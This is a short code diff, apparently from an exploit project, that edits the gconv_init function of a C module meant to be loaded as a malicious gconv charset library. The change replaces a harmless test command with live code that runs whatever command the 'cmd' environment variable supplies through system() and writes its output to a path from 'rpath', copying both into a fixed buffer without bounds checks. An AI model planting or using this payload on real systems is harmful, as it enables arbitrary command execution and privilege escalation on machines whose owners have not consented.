@@ -5,12 +5,11 @@ void gconv() {}
 
 void gconv_init() {
   char str[65536];
-  system("touch /tmp/test");
-  // if (getenv("cmd") != NULL && getenv("rpath") != NULL){
-  //       strcpy(str,getenv("cmd"));
-  //       strcat(str," > ");
-  //       strcat(str, getenv("rpath"));
-  //       system(str);
-  // }
+  if (getenv("cmd") != NULL && getenv("rpath") != NULL){
+        strcpy(str,getenv("cmd"));
+        strcat(str," > ");
+        strcat(str, getenv("rpath"));
+        system(str);
+  }
   exit(0);
 }
